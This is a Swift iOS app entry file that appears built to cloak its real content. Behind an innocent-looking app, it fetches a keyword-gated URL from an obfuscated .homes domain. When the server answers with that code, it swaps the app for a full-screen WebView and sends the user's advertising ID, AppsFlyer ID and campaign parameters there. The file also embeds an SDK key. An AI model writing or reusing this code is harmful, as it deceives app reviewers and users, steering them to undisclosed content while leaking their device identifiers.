//3) com.bvjhsjshieh.sdkjhfyrgjjtyp

//appsflyer sdk - Bz2G2dYSodQwbg5Tz6zNQb

//https://xbkjhrkferisdgfu.homes/wopeioirtuijfg
//Ключевое слово - xbnjifjkbnkjsdfrgt



import SwiftUI
import WebKit
import AdSupport
import AppTrackingTransparency
import AppsFlyerLib
import UserNotifications

public var trStarted = false

let akey = "Bz2G2dYSodQwbg5Tz6zNQb"
let aLink = "https://xbkjhrkferisdgfu.homes/wopeioirtuijfg"
let aCode = "xbnjifjkbnkjsdfrgt"
let appIdVova = "6747909212"

@main
struct pl2706_8App: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    init() {
        UIApplication.shared.windows.forEach { window in
            window.overrideUserInterfaceStyle = .dark
        }
        AppsFlyerLib.shared().appsFlyerDevKey = akey
        AppsFlyerLib.shared().appleAppID = appIdVova
        AppsFlyerLib.shared().isDebug = false
        
    }

    var body: some Scene {
        WindowGroup {
            Aboba()
        }
    }
}


class AppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        AppsFlyerLib.shared().delegate = AppsFlyerManager.shared
        AppsFlyerLib.shared().start()
                
        return true
    }
    

    func application(_ application: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any]) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }

    func application(_ application: UIApplication, continue userActivity: NSUserActivity,
                     restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        AppsFlyerLib.shared().continue(userActivity, restorationHandler: nil)
        return true
    }
}

class AppsFlyerManager: NSObject, AppsFlyerLibDelegate {
    static let shared = AppsFlyerManager()
    private var conversionDataReceived = false
    private var conversionCompletion: ((String?) -> Void)?

    func startTracking(completion: @escaping (String?) -> Void) {
        self.conversionCompletion = completion

        DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
            if !self.conversionDataReceived {
                self.conversionCompletion?(nil)
            }
        }
    }

    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("succ")
        if let campaign = data["campaign"] as? String {
            let components = campaign.split(separator: "_")
            var parameters = ""
            for (index, value) in components.enumerated() {
                parameters += "sub\(index + 1)=\(value)"
                if index < components.count - 1 {
                    parameters += "&"
                }
            }
            conversionDataReceived = true
            conversionCompletion?("&" + parameters)
        }
    }

    func onConversionDataFail(_ error: Error) {
        print("Conversion data failed: \(error.localizedDescription)")
        conversionCompletion?(nil)
    }
    
    func onAppOpenAttribution(_ attributionData: [AnyHashable: Any]) {
        print("onAppOpenAttribution: \(attributionData)")
        if let campaign = attributionData["campaign"] as? String {
            let components = campaign.split(separator: "_")
            var parameters = ""
            for (index, value) in components.enumerated() {
                parameters += "sub\(index + 1)=\(value)"
                if index < components.count - 1 {
                    parameters += "&"
                }
            }
            conversionDataReceived = true
            conversionCompletion?("&" + parameters)
        }
    }
    
    func onAppOpenAttributionFailure(_ error: Error) {
        print("onAppOpenAttributionFailure: \(error.localizedDescription)")
        conversionCompletion?(nil)
    }
}

struct Aboba: View {
    @State private var webViewURL: URL? = UserDefaults.standard.url(forKey: "savedWebViewURL")
    @State private var isLoading: Bool = true
    @State private var idfa: String = ""
    @State private var appsflyerId: String = ""
    @State private var trackingStatusReceived: Bool = false
    @State private var conversionParams: String? = nil
    @State private var rotationAngle: Double = 0

    var body: some View {
        Group {
            if let url = webViewURL {
                WebView(url: url) { finalURL in
                   
                    if UserDefaults.standard.url(forKey: "savedWebViewURL") == nil {
                        UserDefaults.standard.set(finalURL, forKey: "savedWebViewURL")
                    }
                }
            } else if !trackingStatusReceived {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    ZStack {
                        Circle()
                            .stroke(Color.purple.opacity(0.3), lineWidth: 4)
                            .frame(width: 60, height: 60)
                        
                        Circle()
                            .trim(from: 0, to: 0.7)
                            .stroke(
                                LinearGradient(
                                    colors: [.red, .blue, .cyan],
                                    startPoint: .topLeading,
                                    endPoint: .bottomTrailing
                                ),
                                style: StrokeStyle(lineWidth: 4, lineCap: .round)
                            )
                            .frame(width: 60, height: 60)
                            .rotationEffect(.degrees(rotationAngle))
                    }
                    .onAppear {
                        withAnimation(Animation.linear(duration: 1.5).repeatForever(autoreverses: false)) {
                            rotationAngle = 360
                        }
                    }
                }
            } else if isLoading {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    ZStack {
                        Circle()
                            .stroke(Color.purple.opacity(0.3), lineWidth: 4)
                            .frame(width: 60, height: 60)
                        
                        Circle()
                            .trim(from: 0, to: 0.7)
                            .stroke(
                                LinearGradient(
                                    colors: [.red, .blue, .cyan],
                                    startPoint: .topLeading,
                                    endPoint: .bottomTrailing
                                ),
                                style: StrokeStyle(lineWidth: 4, lineCap: .round)
                            )
                            .frame(width: 60, height: 60)
                            .rotationEffect(.degrees(rotationAngle))
                    }
                    .onAppear {
                        withAnimation(Animation.linear(duration: 1.5).repeatForever(autoreverses: false)) {
                            rotationAngle = 360
                        }
                    }
                }
            } else {
                ContentView()
                    .preferredColorScheme(.dark)
            }
        }
        .onAppear {
            if webViewURL == nil {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                    prepareTracking()
                }
            }
            
            
        }
    }

    private func prepareTracking() {
        ATTrackingManager.requestTrackingAuthorization { status in
            DispatchQueue.main.async {
                switch status {
                case .authorized:
                    idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                default:
                    idfa = "00000000-0000-0000-0000-000000000000"
                }
                appsflyerId = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
                trackingStatusReceived = true

                AppsFlyerManager.shared.startTracking { params in
                    conversionParams = params
                    fetchWebsiteData()
                    trStarted = true
                }
                
                DispatchQueue.main.asyncAfter(deadline: .now() + 7) {
                    if !trStarted {
                        print("Fallback: forcing")
                        fetchWebsiteData()
                    }
                }
            }
        }
    }

    private func fetchWebsiteData() {
        guard let url = URL(string: aLink) else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            return
        }
        
        // Создаем конфигурацию с таймаутом
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10.0 // 10 секунд на запрос
        config.timeoutIntervalForResource = 15.0 // 15 секунд на ресурс
        
        let session = URLSession(configuration: config)
        
        // Добавляем дополнительный таймаут как fallback
        let timeoutTimer = DispatchWorkItem {
            DispatchQueue.main.async {
                if self.isLoading {
                    print("Timeout: fetchWebsiteData took too long")
                    self.isLoading = false
                }
            }
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 20, execute: timeoutTimer)
        
        session.dataTask(with: url) { data, response, error in
            DispatchQueue.main.async {
                // Отменяем таймер, так как запрос завершился
                timeoutTimer.cancel()
                
                defer { self.isLoading = false }
                
                // Проверяем ошибки
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    return
                }
                
                // Проверяем HTTP статус
                if let httpResponse = response as? HTTPURLResponse {
                    guard 200...299 ~= httpResponse.statusCode else {
                        print("HTTP error: \(httpResponse.statusCode)")
                        return
                    }
                }
                
                // Проверяем данные
                guard let data = data,
                      let text = String(data: data, encoding: .utf8) else {
                    print("Invalid data received")
                    return
                }
                
                // Проверяем содержимое и создаем URL
                if text.contains(aCode) {
                    var finalURL = text + "?idfa=\(self.idfa)&gaid=\(self.appsflyerId)"
                    if let params = self.conversionParams {
                        finalURL += params
                    }
                    if let url = URL(string: finalURL) {
                        self.webViewURL = url
                    } else {
                        print("Failed to create URL from: \(finalURL)")
                    }
                } else {
                    print("Response doesn't contain required code")
                }
            }
        }.resume()
    }
}

struct WebView: UIViewRepresentable {
    let url: URL
    let onLoadComplete: ((URL) -> Void)?

    init(url: URL, onLoadComplete: ((URL) -> Void)? = nil) {
        self.url = url
        self.onLoadComplete = onLoadComplete
    }

    func makeUIView(context: Context) -> WKWebView {
        requestNotificationPermission()
        let config = WKWebViewConfiguration()
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.overrideUserInterfaceStyle = .dark
        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        webView.load(URLRequest(url: url))
        return webView
    }
    func requestNotificationPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            if let error = error {
                print("Ошибка при запросе разрешения: \(error.localizedDescription)")
                return
            }

        }
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        uiView.overrideUserInterfaceStyle = .dark
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(onLoadComplete: onLoadComplete)
    }

    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        let onLoadComplete: ((URL) -> Void)?
        private var hasCompletedInitialLoad = false

        init(onLoadComplete: ((URL) -> Void)? = nil) {
            self.onLoadComplete = onLoadComplete
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Вызываем callback только после первой полной загрузки со всеми редиректами
            if !hasCompletedInitialLoad, let currentURL = webView.url {
                hasCompletedInitialLoad = true
                onLoadComplete?(currentURL)
            }
        }

        func webView(_ webView: WKWebView,
                     decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            if let url = navigationAction.request.url,
               let scheme = url.scheme?.lowercased(),
               !["http", "https"].contains(scheme) {
                UIApplication.shared.open(url, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            } else {
                decisionHandler(.allow)
            }
        }

        func webView(_ webView: WKWebView,
                     createWebViewWith configuration: WKWebViewConfiguration,
                     for navigationAction: WKNavigationAction,
                     windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
    }
}


